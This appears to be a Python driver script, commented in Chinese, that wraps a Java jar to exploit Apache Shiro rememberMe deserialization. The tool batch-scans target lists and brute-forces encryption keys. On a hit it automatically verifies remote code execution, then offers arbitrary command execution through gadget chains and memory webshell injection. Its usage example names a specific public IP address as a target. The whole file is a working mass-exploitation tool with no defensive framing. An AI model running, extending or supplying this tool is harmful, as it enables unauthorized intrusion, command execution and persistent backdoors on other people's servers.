#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
shirokit.py — 独立 Shiro 利用工具驱动 (封装 shiro-claude.jar)

用法:
  python shirokit.py scan <url|目标文件> [cookie名] [每目标线程] [并发目标数]
      # 单 URL 或文件(每行 host[:port] 或 http://...) 批量爆破
      # 命中 key 自动 rce 验证, 结果写入 shirokit_results.json
  python shirokit.py rce <url> <key> [cookie名]
  python shirokit.py exec <url> <key> <chain> <echo> <cmd> [cookie名]
  python shirokit.py memshell <url> <key> <echo> <path> [cookie名]
  python shirokit.py chains | echoes | keys

例:
  python shirokit.py scan http://36.138.188.90:8081/
  python shirokit.py scan targets.txt rememberMe 20 5
"""
import subprocess, sys, os, json, re, concurrent.futures, time

# Windows 下强制 UTF-8 输出, 否则 print(java 输出) 遇非 ASCII 字符抛 UnicodeEncodeError(GBK)
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

JAR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "shiro-claude.jar")
RESULT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "shirokit_results.json")


def run_jar(*args, timeout=180):
    # -Dfile.encoding=UTF-8 强制 java 侧 UTF-8 输出(Java8 下 System.out 用 file.encoding),
    # 否则 Windows 上 java 输出中文是 GBK, python 按 UTF-8 读会乱码
    p = subprocess.run(["java", "-Dfile.encoding=UTF-8", "-Dsun.stdout.encoding=UTF-8",
                        "-Dsun.stderr.encoding=UTF-8", "-jar", JAR] + list(args),
                       capture_output=True, text=True, encoding="utf-8",
                       errors="replace", timeout=timeout)
    return p.stdout, p.stderr


def norm_url(t):
    t = t.strip()
    if not t:
        return None
    if not t.startswith(("http://", "https://")):
        t = "http://" + t
    if not t.endswith("/"):
        t += "/"
    return t


def safe_int(s, default):
    """把字符串转 int, 失败/None 时用默认值 — 防止参数错位崩掉"""
    try:
        return int(s)
    except (ValueError, TypeError):
        return default


def scan_one(url, cookie="rememberMe", threads=20):
    """单目标扫描+爆破+自动RCE验证, 返回结果 dict"""
    res = {"url": url, "cookie": cookie, "shiro": False, "key": None, "rce": False, "chain": None, "echo": None, "whoami": None}
    try:
        out, err = run_jar("scan", url, cookie, str(threads))
        if "SHIRO=YES" in out:
            res["shiro"] = True
            hits = sorted(set(re.findall(r"KEY=HIT (\S+)", out)))
            if hits:
                if len(hits) >= 3:
                    # 假阳性: 真 Shiro 仅一个正确 key, 多 HIT = 目标对所有 rememberMe 均返回 deleteMe 差异(SPC 判定失真)
                    res["fp"] = True
                else:
                    res["key"] = hits[0]
                    # 自动 RCE 验证
                    rce_out, _ = run_jar("rce", url, hits[0], cookie)
                    m = re.search(r"RCE=OK chain=(\S+) echo=(\S+)", rce_out)
                    om = re.search(r"OUT=(.*)", rce_out, re.S)
                    if m:
                        res["rce"] = True
                        res["chain"], res["echo"] = m.group(1), m.group(2)
                    if om:
                        res["whoami"] = om.group(1).strip()[:200]
    except Exception as e:
        res["error"] = str(e)
    return res


def scan_batch(targets, cookie="rememberMe", threads=20, workers=4):
    """批量多进程扫描, 结果落盘 JSON"""
    results = []
    with concurrent.futures.ProcessPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(scan_one, t, cookie, threads): t for t in targets}
        for i, fut in enumerate(concurrent.futures.as_completed(futures), 1):
            r = fut.result()
            results.append(r)
            tag = "FP" if r.get("fp") else ("RCE!" if r["rce"] else ("KEY" if r["key"] else ("SHIRO" if r["shiro"] else "no")))
            print(f"[{i}/{len(targets)}] {tag:5s} {r['url']}  key={r['key']}  whoami={r['whoami']}")
    with open(RESULT_FILE, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"\n[+] 结果已写入 {RESULT_FILE}")
    rce_hits = [r for r in results if r["rce"]]
    key_hits = [r for r in results if r["key"] and not r["rce"]]
    fp_hits = [r for r in results if r.get("fp")]
    print(f"[*] 汇总: 共{len(results)} 命中key={len(key_hits)+len(rce_hits)} RCE可执行={len(rce_hits)} 假阳性={len(fp_hits)}")
    if fp_hits:
        print("[!] 假阳性目标(多KEY=HIT, SPC判定失真, 非真实 Shiro key):")
        for r in fp_hits:
            print(f"    {r['url']}")
    return results


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return
    cmd = sys.argv[1]
    try:
        if cmd == "scan":
            arg = sys.argv[2]
            is_url = arg.startswith(("http://", "https://")) or ":" in arg.split("/")[0]
            if is_url:
                # 单 URL: 参数 = url [cookie], 多余参数忽略
                cookie = sys.argv[3] if len(sys.argv) > 3 and "://" not in sys.argv[3] else "rememberMe"
                r = scan_one(norm_url(arg), cookie, 20)
                print(json.dumps(r, ensure_ascii=False, indent=2))
            else:
                # 文件: 参数 = file [cookie [threads [workers]]]
                cookie = sys.argv[3] if len(sys.argv) > 3 else "rememberMe"
                threads = safe_int(sys.argv[4], 20) if len(sys.argv) > 4 else 20
                workers = safe_int(sys.argv[5], 4) if len(sys.argv) > 5 else 4
                with open(arg, "r", encoding="utf-8", errors="replace") as f:
                    targets = [norm_url(l) for l in f if norm_url(l)]
                print(f"[*] 目标数: {len(targets)}")
                scan_batch(targets, cookie, threads, workers)
        elif cmd == "rce":
            out, _ = run_jar("rce", norm_url(sys.argv[2]), sys.argv[3], sys.argv[4] if len(sys.argv) > 4 else "rememberMe")
            print(out)
        elif cmd == "exec":
            url, key, chain, echo, cmdstr = norm_url(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6]
            cn = sys.argv[7] if len(sys.argv) > 7 else "rememberMe"
            out, _ = run_jar("exec", url, key, chain, echo, cmdstr, cn)
            print(out)
        elif cmd == "memshell":
            url, key, echo, path = norm_url(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5]
            cn = sys.argv[6] if len(sys.argv) > 6 else "rememberMe"
            out, _ = run_jar("memshell", url, key, echo, path, cn)
            print(out)
        elif cmd in ("chains", "echoes", "keys"):
            out, _ = run_jar(cmd)
            print(out)
        else:
            print(__doc__)
    except IndexError:
        print(__doc__)


if __name__ == "__main__":
    main()
